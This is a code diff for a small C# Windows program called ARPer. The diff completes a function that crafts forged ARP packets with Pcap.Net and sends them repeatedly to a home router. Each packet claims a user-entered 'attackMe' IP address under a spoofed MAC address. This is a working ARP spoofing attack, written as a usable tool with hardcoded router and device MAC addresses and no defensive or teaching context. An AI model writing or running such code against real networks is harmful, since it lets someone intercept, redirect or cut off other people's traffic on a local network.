@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Collections.ObjectModel;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
@@ -61,13 +62,13 @@ namespace ARPer
                 if (radioButton1.IsChecked == true)
                 {
                     //fuzzy logic
-                    mac = "FCB0C4A24E50";
+                    mac = "FC:B0:C4:A2:4E:50";
                     ip = "192.168.1.1";
                 }
                 else if (radioButton2.IsChecked == true)
                 {
                     //this better work
-                    mac = "C83A35074168";
+                    mac = "C8:3A:35:07:41:68";
                     ip = "192.168.0.1";
                 }
                 sendArp(attackMe.Text, mac, ip); 
@@ -106,8 +107,8 @@ namespace ARPer
 
         private void sendArp(string attackIP, string routerMAC, string routerIP)
         {
-            string myMAC = "A0A8CD9ACBAD";
-            string arpSenderMAC = "0A5A7B303F71";
+            string myMAC = "A0:A8:CD:9A:CB:AD";
+            string arpSenderMAC = "0A:5A:7B:30:3F:71";
             IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
             if (allDevices.Count == 0)
             {
@@ -124,8 +125,46 @@ namespace ARPer
                     Console.WriteLine(" (No description available)");
             }
             int deviceIndex = 2; //TODO: make this choosable
+            PacketDevice selectedDevice = allDevices[deviceIndex];
+            using (PacketCommunicator communicator = selectedDevice.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000))
+            {
+                MacAddress source = new MacAddress(myMAC);
+                MacAddress destination = new MacAddress(routerMAC);
+                EthernetLayer ethLayer = new EthernetLayer
+                {
+                    Source = source,
+                    Destination = destination
+                };
+                ArpLayer arpLayer = new ArpLayer
+                {
+                    ProtocolType = EthernetType.IpV4,
+                    Operation = ArpOperation.Request,
+                    SenderHardwareAddress = makeMAC (arpSenderMAC),
+                    SenderProtocolAddress = makeIP (attackIP),
+                    TargetHardwareAddress = new byte[] { 0, 0, 0, 0, 0, 0 }.AsReadOnly(),
+                    TargetProtocolAddress = makeIP(routerIP)
+                };
+                PacketBuilder builder = new PacketBuilder(ethLayer, arpLayer);
+                Packet packet = builder.Build(DateTime.Now);
+                for (int i = 0; i < 100; i++)
+                {
+                    communicator.SendPacket(packet);
+                }
+            }
+        }
 
-            throw new NotImplementedException();            
+        private ReadOnlyCollection<byte> makeIP(string attackIP)
+        {
+            List<byte> ip = new List<byte>();
+            ip.AddRange(attackIP.Split('.').Select(b => Convert.ToByte(b, 10)));
+            return ip.AsReadOnly();
+        }
+
+        private ReadOnlyCollection<byte> makeMAC(string arpSenderMAC)
+        {
+            List<byte> mac = new List<byte>();
+            mac.AddRange(arpSenderMAC.Split(':').Select(b => Convert.ToByte(b, 16)));
+            return mac.AsReadOnly();
         }
     }
 }
